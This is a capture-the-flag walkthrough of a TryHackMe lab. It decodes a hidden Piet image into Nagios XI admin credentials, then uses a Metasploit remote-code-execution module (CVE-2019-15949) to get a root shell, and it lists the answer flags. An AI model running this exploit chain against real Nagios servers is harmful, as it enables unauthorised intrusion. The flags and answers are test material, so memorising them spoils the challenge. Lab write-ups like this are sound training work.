# Nax

## nmap
Command:
```bash
nmap 10.10.52.148 -sV -sC -oN nmap_results -p- -vv
```

Relevant ports:
- 80

## website
The website shows the following text:\
"Welcome to elements.                   Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr"

Aligning the [Periodic table of elements](https://upload.wikimedia.org/wikipedia/commons/8/89/Colour_18-col_PT_with_labels.png) 
     and the [Ascii table](https://upload.wikimedia.org/wikipedia/commons/2/26/ASCII_Table_%28suitable_for_printing%29.svg),
    we get this:
| Element | ordinal number | ascii character |
| ------- | -------------- | --------------- |
|   Ag    |       47       |        /        |
|   Hg    |       80       |        P        |
|   Ta    |       73       |        I        |
|   Sb    |       51       |        3        |
|   Po    |       84       |        T        |
|   Pd    |       46       |        .        |
|   Hg    |       80       |        P        |
|   Pt    |       78       |        N        |
|   Lr    |      103       |        g        |

### "What hidden file did you find?"
==> **PI3T.PNg**

```bash
curl -LO $IP/PI3T.PNg

exiftool PI3T.PNg # -> Piet Mondrian
```

### "Who is the creator of the file?"
==> **Piet Mondrian**


## [Piet](https://esolangs.org/wiki/Piet)

*TLDR: Piet is an esolang in which a program looks like an abstract painting*

Interpreting the file using fpiet [(aur)](https://aur.archlinux.org/packages/fpiet):
```bash
fpiet PI3T.PNg # -> error
gimp PI3T.PNg # File -> Export as ... -> PI3T_updated.png -> Export
fpiet PI3T_updated.png | head -c 32 # -> nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
```

Splitting *nagiosadmin%n3p3UQ&9BjLp4$7uhWdY* on % seems to return a username and password

### "What is the username you found?"
==> **nagiosadmin**

### "What is the password you found?"
==> **n3p3UQ&9BjLp4$7uhWdY**



## gobuster
Command:
```bash
gobuster -u $IP -w /opt/wordlists/dsstorewordlist.txt -r | tee gobuster_results.txt
```

Relevant results:
- /index.php


From `/index.php` there's a link to `/nagiosxi/login.php`

Using *nagiosadmin* and *n3p3UQ&9BjLp4$7uhWdY* as username and password we can log in to [Nagios Xi](https://www.nagios.com/)


## Nagios Xi

Trying to do anything always shows "License expired", so we first switch to a free license (*Enter your license key* -> *License Type:* Free, *Update License* )

Right away there's a message that a new update is available. In the bottom left of the page it says 'Nagios XI 5.5.6', so there might be a vulnerability for this version.

## exploitation

```bash
searchsploit nagios # -> Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution
# Note: THM actually expected a different exploit but I imagine the process is similar
# Expected payload: exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce

msfconsole
    # metasploit console

    search nagios
    use exploit/linux/http/nagios_xi_magpie_debug
    
    # get host ip
    echo $IP
    set RHOSTS <host ip>

    # get local ip
    ip a | grep tun0
    set RSRVHOST <local ip>

    set LHOST <local ip>

    run

    sessions -i 1
        # meterpreter

        ls /home # -> galand
        cd /home/galand
        ls # -> user.txt
        cat user.txt # -> THM{84b17add1d72a9f2e99c33bc568ae0f1}

        cd /root
        ls -al # -> root.txt

        cat /root/root.txt # -> THM{c89b2e39c83067503a6508b21ed6e962}
```

### "What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000"
==> **CVE-2019-15949**


### "After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?"
==> **exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce**


### "Compromise the machine and locate user.txt"
==> **THM{84b17add1d72a9f2e99c33bc568ae0f1}**


### "Locate root.txt"
==> **THM{c89b2e39c83067503a6508b21ed6e962}**
